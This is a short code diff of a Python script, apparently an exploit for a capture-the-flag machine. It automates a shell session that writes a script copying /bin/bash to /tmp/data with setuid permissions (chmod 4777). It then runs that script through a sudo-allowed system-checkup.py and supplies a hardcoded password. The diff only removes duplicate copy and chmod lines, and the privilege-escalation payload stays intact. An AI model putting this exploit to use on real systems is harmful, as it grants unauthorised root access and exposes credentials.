@@ -104,8 +104,6 @@ def create_backup_file():
     commands_send(""" echo "
 > echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/data\nchmod 4777 /tmp/data' > full-checkup.sh
 > cat full-checkup.sh 
-> cp /bin/bash /tmp/data
-> chmod 4777 /tmp/data
 > chmod +x full-checkup.sh 
 > sudo -S python3 /opt/scripts/system-checkup.py full-checkup
 > jh1usoih2bkjaspwe92
@@ -175,8 +173,6 @@ def unlocked():
                     shell.send("EOF\n")
                     cm.sleep(0.6)
                     shell.send("cat full-checkup.sh" + "\n") ; cm.sleep(1)
-                    shell.send("cp /bin/bash /tmp/data" + "\n"); cm.sleep(1)
-                    shell.send("chmod 4777 /tmp/data" + "\n") ; cm.sleep(1)
                     shell.send("chmod +x full-checkup.sh" + "\n") ; cm.sleep(1)
                     shell.send("sudo -S python3 /opt/scripts/system-checkup.py full-checkup" + "\n"); cm.sleep(1)
                     shell.send("jh1usoih2bkjaspwe92" + "\n") ; cm.sleep(1)
